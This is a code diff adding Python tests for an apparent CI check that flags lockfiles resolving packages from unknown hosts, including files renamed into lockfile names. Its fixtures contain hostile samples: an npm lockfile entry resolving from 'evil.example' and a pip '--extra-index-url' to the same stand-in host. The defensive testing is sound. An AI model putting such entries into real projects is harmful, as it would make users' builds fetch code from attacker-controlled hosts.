@@ -910,6 +910,42 @@ def test_a_renamed_lockfile_is_compared_with_its_old_path_in_the_base():
     assert out.exit_code == 0, out.message
 
 
+def pure_rename(old, new):
+    return (f"diff --git a/{old} b/{new}\nsimilarity index 100%\n"
+            f"rename from {old}\nrename to {new}\n")
+
+
+EVIL_NPM = b'{"packages": {"node_modules/a": {"resolved": "https://evil.example/a.tgz"}}}\n'
+
+
+def test_a_file_renamed_into_a_lockfile_name_is_checked_whole():
+    # PR 1 adds tests/fixtures/lock.json (no lockfile check: not a lockfile
+    # name); PR 2 renames it, unchanged, to package-lock.json. The base at
+    # the old path is no lockfile, so none of its values may count as known.
+    gh = FakeGitHub(diff=pure_rename("tests/fixtures/lock.json", "package-lock.json"),
+                    files={"package-lock.json": EVIL_NPM},
+                    base_files={"tests/fixtures/lock.json": EVIL_NPM})
+    out, _ = run(gh)
+    assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]
+
+
+def test_a_file_renamed_into_a_line_checked_lockfile_name_is_checked_whole():
+    # A pure rename shows no lines: the line check must read the whole file.
+    evil = b"--extra-index-url https://evil.example/simple\n"
+    gh = FakeGitHub(diff=pure_rename("docs/deps.txt", "requirements.txt"),
+                    files={"requirements.txt": evil}, base_files={"docs/deps.txt": evil})
+    out, _ = run(gh)
+    assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]
+
+
+def test_a_lockfile_moved_to_another_directory_keeps_its_base():
+    gh = FakeGitHub(diff=pure_rename("a/package-lock.json", "b/package-lock.json"),
+                    files={"b/package-lock.json": EVIL_NPM},
+                    base_files={"a/package-lock.json": EVIL_NPM})
+    out, _ = run(gh)
+    assert out.exit_code == 0, out.message
+
+
 def test_a_base_lockfile_fetch_error_other_than_404_is_infra():
     gh = FakeGitHub(diff=LOCK_DIFF, files=EVIL_LOCK,
                     base_files={"uv.lock": GitHubError("file-content", 502)})
